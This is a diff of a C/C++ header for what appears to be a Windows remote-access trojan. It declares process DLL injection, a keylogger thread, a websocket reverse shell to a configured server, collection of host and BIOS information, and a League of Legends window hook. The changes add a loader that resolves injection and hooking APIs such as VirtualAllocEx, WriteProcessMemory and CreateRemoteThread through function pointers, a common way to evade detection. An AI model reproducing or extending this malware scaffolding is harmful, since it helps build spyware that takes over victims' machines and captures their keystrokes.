@@ -28,6 +28,7 @@
 
 #pragma warning(disable:4996)
 
+
 EXTERN_C_START
 
 /******************************CONFIGURATION******************************/
@@ -57,7 +58,7 @@ EXTERN_C_START
 #define PATH_SIZE			2048
 #define URL_SIZE			4096
 #define UUID_SIZE			256
-#define INFORMATION_SIZE	4096
+#define INFORMATION_SIZE	2048
 #define WS_SERVER_URL		"wss://" SERVER_NAME_A REVERSE_SHELL_WS_A
 
 
@@ -103,7 +104,7 @@ typedef enum InformationType
 	BIOS_UUID
 } InformationType;
 
-BOOL dmi_system_uuid(const PBYTE biosTableData, SHORT version, LPSTR uuid);
+BOOL dmi_system_uuid(const PBYTE biosTableData, SHORT version, LPSTR uuid, SIZE_T maxLength);
 VOID dmi_string(const dmi_header* header, BYTE index, LPSTR destination, SIZE_T maxLength);
 BOOL GetInformation(LPSTR destination, DWORD maxLength, InformationType informationType);
 cJSON* CreateInformationsJsonObject();
@@ -111,9 +112,16 @@ BOOL SendClientInformations();
 
 /********************************************************************************************************************************/
 // injection.cpp
+typedef struct ProcessForDllInjection
+{
+	DWORD processId;
+	BOOL running;
+} ProcessForDllInjection;
+
 BOOL WritePa5aDll();
 BOOL inject(DWORD processId);
 DWORD GetProcessIdFormProcessName(LPCWSTR processName);
+VOID checkProcessForDllInjection(ProcessForDllInjection* infos, LPCWSTR processName);
 DWORD WINAPI ThreadInjector();
 
 /********************************************************************************************************************************/
@@ -129,6 +137,42 @@ DWORD WINAPI ThreadKeylogger();
 // LeagueOfLegends.cpp
 LRESULT CALLBACK leagueOfLengendsWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
 DWORD ThreadLeagueOfLegends();
+
+/********************************************************************************************************************************/
+// loader.cpp
+typedef HHOOK (WINAPI* SetWindowsHookExAProc)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
+typedef HHOOK (WINAPI* SetWindowsHookExWProc)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
+typedef LPVOID (WINAPI* VirtualAllocExProc)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef BOOL (WINAPI* WriteProcessMemoryProc)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
+typedef HANDLE (WINAPI* CreateRemoteThreadProc)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+typedef HANDLE (WINAPI* CreateToolhelp32SnapshotProc)(DWORD dwFlags, DWORD th32ProcessID);
+typedef BOOL (WINAPI* Process32FirstWProc)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
+typedef BOOL (WINAPI* Process32NextWProc)(HANDLE  hSnapshot, LPPROCESSENTRY32W lppe);
+typedef DWORD (WINAPI* GetWindowThreadProcessIdProc)(HWND hWnd, LPDWORD lpdwProcessId);
+typedef HANDLE (WINAPI* OpenProcessProc)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
+typedef BOOL (WINAPI* TerminateProcessProc)(HANDLE hProcess, UINT uExitCode);
+typedef BOOL (WINAPI* CreateProcessAProc)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+typedef BOOL (WINAPI* CreateProcessWProc)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+typedef UINT (WINAPI* GetSystemFirmwareTableProc)(DWORD FirmwareTableProviderSignature, DWORD FirmwareTableID, PVOID pFirmwareTableBuffer, DWORD BufferSize);
+
+extern HMODULE hKernel32;
+extern HMODULE hUser32;
+extern SetWindowsHookExAProc MySetWindowsHookExA;
+extern SetWindowsHookExWProc MySetWindowsHookExW;
+extern VirtualAllocExProc MyVirtualAllocEx;
+extern WriteProcessMemoryProc MyWriteProcessMemory;
+extern CreateRemoteThreadProc MyCreateRemoteThread;
+extern CreateToolhelp32SnapshotProc MyCreateToolhelp32Snapshot;
+extern Process32FirstWProc MyProcess32FirstW;
+extern Process32NextWProc MyProcess32NextW;
+extern GetWindowThreadProcessIdProc MyGetWindowThreadProcessId;
+extern OpenProcessProc MyOpenProcess;
+extern TerminateProcessProc MyTerminateProcess;
+extern CreateProcessAProc MyCreateProcessA;
+extern CreateProcessWProc MyCreateProcessW;
+extern GetSystemFirmwareTableProc MyGetSystemFirmwareTable;
+
+BOOL loader();
 
 /********************************************************************************************************************************/
 // main.cpp
@@ -182,15 +226,15 @@ DWORD WINAPI ThreadReverseShell();
 // utils.cpp
 VOID CreateConsole();
 LONGLONG GetTimestamp(BOOL inMlliseconds);
-int gettimeofday(struct timeval* tp, struct timezone* tzp);
+VOID gettimeofday(struct timeval* tp, struct timezone* tzp);
 LONGLONG SystemTimeToUnixTimestamp(SYSTEMTIME system_time);
 SYSTEMTIME UnixTimestampToSystemTime(LONGLONG timestamp);
 PCHAR encode_UTF8(LPCWCHAR messageUTF16);
 
 /********************************************************************************************************************************/
 // ws.cpp
-static void connect_client(lws_sorted_usec_list_t* sul);
-static int callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void* user, void* in, size_t len);
+VOID connect_client(lws_sorted_usec_list_t* sul);
+INT callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void* user, void* in, size_t len);
 BOOL WS_Connection();
 
 EXTERN_C_END
